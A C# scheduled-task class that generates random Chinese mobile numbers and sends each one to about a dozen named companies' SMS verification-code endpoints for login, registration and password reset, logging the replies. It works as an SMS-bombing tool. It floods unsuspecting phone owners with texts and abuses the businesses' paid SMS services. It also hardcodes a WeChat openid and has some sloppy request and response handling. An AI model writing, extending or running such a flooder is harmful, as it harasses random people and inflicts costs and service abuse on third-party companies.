using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using ASF.Internal.Security;
using Coravel.Invocable;
using IdGen;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

namespace ASF.Domain.Services
{
  /// <summary>
  /// 定时发送短信任务
  /// </summary>
  public class RunSendPhoneTasks : IInvocable
  {
    private readonly ILogger<RunSendPhoneTasks> _logger;
    /// <summary>
    /// 定时发送短信任务
    /// </summary>
    public RunSendPhoneTasks(ILogger<RunSendPhoneTasks> logger)
    {
      _logger = logger;
    }
    /// <summary>
    /// 激活定时任务
    /// </summary>
    /// <returns></returns>
    public async Task Invoke()
    {
      var generatorId = new Random().Next(0, 1023);
      // Let's say we take april 1st 2015 as our epoch
      var epoch = new DateTime(2020, 4, 1, 0, 0, 0, DateTimeKind.Utc);
      // Create a mask configuration of 45 bits for timestamp, 2 for generator-id 
      // and 16 for sequence
      var mc = new IdStructure(41, 10, 12);
      // Create an IdGenerator with it's generator-id set to 0, our custom epoch 
      // and mask configuration
      IdGeneratorOptions options = new IdGeneratorOptions(mc, new DefaultTimeSource(epoch));
      var generator = new IdGenerator(generatorId, options);
      // 克徕帝
      string sendUrl2 = "https://newapplet.crd.cn/Api/Member/Member/SendNewMobileCode?mobile={0}&source=MP-WEIXIN&openid=oTZkE5KTYsIlSTh1gKZ223jeovfI";
      // lihang 
      string senLingHang = "https://study.mshengedu.com/study/sys/validCode/getCode";
      // 展通安全
      string sendZtUrl = "https://tnwgh.hnztaqkj.com/Home/SendSmsForResetPwd";
      // 上海 body365
      // string sendUrl = "https://www.body365.cn/Home/SendSMSCode";
      // 赫德物流
      string sendUrlHd = "https://bookinglogin.hart-worldwide.com:9002/driver/loginSms?format=json";
      // // 快乐车行
      // string sendKlch = "https://apiv2.klch.cn/api/Member/SendLoginNoCode?phone={0}";
      // haha 零食
      string sendHaha = "https://mapi.hahabianli.com/msg/sendPhoneCaptcha";
      // 卓帮医药
      // string zhuobang = "https://api.pianyibang.shop/apiv1/common/sms";
      // 展通1
      string zt = "https://edu.hnztaqkj.com/api/api-cms/employee/sendActivateSms?verifyPhone={0}&verifyCode=111&protocolChecked=false";
      //运连网
      string yl = "https://h5.gotofreight.com/api/UserOutside/GetRegistVerifyCode";
      string yl1 = "https://m.gotofreight.com/api/services/app/WebLogin/GetPhoneSecurity";
      //和贵云商
      string hg = "https://platform.feimawaiqin.com/customer-restapi/customerInfo/unauthorized/sendSms";
      // 和贵2 
      string hg2 = "https://www.hnhegui.com/admin-api/system/user/profile/sendLoginCodeByMobile?mobile={0}&type=ADMIN_MEMBER_LOGIN";
      //随机的手机号码
      string[] phoneList = new string[]
      {
        "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "151", "152", "153", "153", "154", "155",
        "156", "157", "158", "159","181","182","183","184","185","186","187","188","189"
      };
      for (int i = 0; i < phoneList.Length; i++)
      {
        long genid = generator.CreateId();
        string[] phone = new[] { genid.ToString().Substring(0, 8), genid.ToString().Substring(8, 8) };
        for (int j = 0; j < phone.Length; j++)
        {
          string data = phoneList[i] + phone[j];
          using (var http = new HttpClient())
          {
            string urlFormat = string.Format(sendUrl2, data);
            //短信发送1
            HttpResponseMessage response1 = await http.GetAsync(new Uri(urlFormat));
            if (response1.IsSuccessStatusCode)
            {
              string t = await response1.Content.ReadAsStringAsync();
              _logger.LogInformation($"克徕帝:{t}");
            }
            
            HttpResponseMessage response2 = await http.GetAsync(new Uri($"https://rent.kilo-coin.com/renting/app/smscode/wxOwnerLogin/{data}"));
            if (response2.IsSuccessStatusCode)
            {
              string t = await response2.Content.ReadAsStringAsync();
              _logger.LogInformation($"公寓宝：{t}");
            }
            
            StringContent httpContent1 = new StringContent(
              JsonConvert.SerializeObject(new { phone = data, validType = "DL" }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response3 = await http.PostAsync(new Uri(senLingHang), httpContent1);
            if (response3.IsSuccessStatusCode)
            {
              string t = await response3.Content.ReadAsStringAsync();
              if (!t.Contains("抱歉，手机号尚未注册，暂不支持使用！") && !t.Contains("操作过于频繁，请稍后重试"))
              {
                _logger.LogInformation($"领航未来教育: {t}");
              }
            }
            
            StringContent httpContent2 = new StringContent(
              JsonConvert.SerializeObject(new { phone = data }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response4 = await http.PostAsync(new Uri(sendHaha), httpContent1);
            if (response4.IsSuccessStatusCode)
            {
              string t = await response4.Content.ReadAsStringAsync();
              _logger.LogInformation($"哈哈零食: {t}");
            }
            
            FormUrlEncodedContent ztHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>()
            {
              ["loginName"] = data,
              ["minutes"] = "1"
            });
            HttpResponseMessage ztResponse = await http.PostAsync(new Uri(sendZtUrl), ztHttpContent);
            if (ztResponse.IsSuccessStatusCode)
            {
              string t = await ztResponse.Content.ReadAsStringAsync();
              if (!t.Contains("400"))
              {
                _logger.LogInformation($"展通安全成功{t}");
              }
            }
            
            // FormUrlEncodedContent httpContent3 = new FormUrlEncodedContent(new Dictionary<string, string>()
            // {
            //   ["val1"] = data,
            //   ["val3"] = "register"
            // });
            // HttpResponseMessage response5 = await http.PostAsync(new Uri(sendUrl), httpContent3);
            // if (response5.IsSuccessStatusCode)
            // {
            //   string t = await response5.Content.ReadAsStringAsync();
            //   _logger.LogInformation($"body365: {t}");
            // }
            
            StringContent httpContent4 = new StringContent(
              JsonConvert.SerializeObject(new { PhoneNumber = data }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response6 = await http.PostAsync(new Uri(sendUrlHd), httpContent4);
            if (response6.IsSuccessStatusCode)
            {
              string t = await response6.Content.ReadAsStringAsync();
              if (!t.Contains("905"))
              {
                _logger.LogInformation($"赫德物流: {t}");
              }
            }
            //
            // FormUrlEncodedContent httpContent5 = new FormUrlEncodedContent(new Dictionary<string, string>()
            // {
            //   ["mobile"] = data,
            //   ["merchid"] = "a5463a3c-8611-45b1-b6c9-57a22fe3c2a2"
            // });
            // HttpResponseMessage response7 = await http.PostAsync(new Uri(zhuobang), httpContent5);
            // if (response7.IsSuccessStatusCode)
            // {
            //   string t = await response7.Content.ReadAsStringAsync();
            //   
            //   _logger.LogInformation($"卓帮医药: {t}");
            // }
            
            string url = string.Format(zt,data);
            HttpResponseMessage response8 = await http.GetAsync(new Uri(url));
            if (response8.IsSuccessStatusCode)
            {
              string t = await response8.Content.ReadAsStringAsync();
              if (!t.Contains("500"))
              {
                _logger.LogInformation($"展通安全1：{t}");
              }
            }
            
            StringContent httpContent5 = new StringContent(
              JsonConvert.SerializeObject(new { Phone = data }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response9 = await http.PostAsync(new Uri(yl), httpContent5);
            if (response6.IsSuccessStatusCode)
            {
              string t = await response9.Content.ReadAsStringAsync();
             
              _logger.LogInformation($"运连物流: {t}");
            }
            
            StringContent httpContent6 = new StringContent(
              JsonConvert.SerializeObject(new { PhoneNumber = data,Status=1 }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response10 = await http.PostAsync(new Uri(yl1), httpContent6);
            if (response6.IsSuccessStatusCode)
            {
              string t = await response10.Content.ReadAsStringAsync();
             
              _logger.LogInformation($"运连物流10: {t}");
            }
            
            StringContent httpContent7 = new StringContent(
              JsonConvert.SerializeObject(new { mobile = data,smsType="MEMBER_HG_LOGIN" }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response11 = await http.PostAsync(new Uri(hg), httpContent7);
            if (response6.IsSuccessStatusCode)
            {
              string t = await response11.Content.ReadAsStringAsync();
             
              _logger.LogInformation($"和贵云商: {t}");
            }
            
            string urlFormat1 = string.Format(hg2, data);
            //短信发送1
            HttpResponseMessage response12 = await http.GetAsync(new Uri(urlFormat1));
            if (response1.IsSuccessStatusCode)
            {
              string t = await response12.Content.ReadAsStringAsync();
              _logger.LogInformation($"和贵云商1: {t}");
            }
          }
        }
      }
    }
  }
}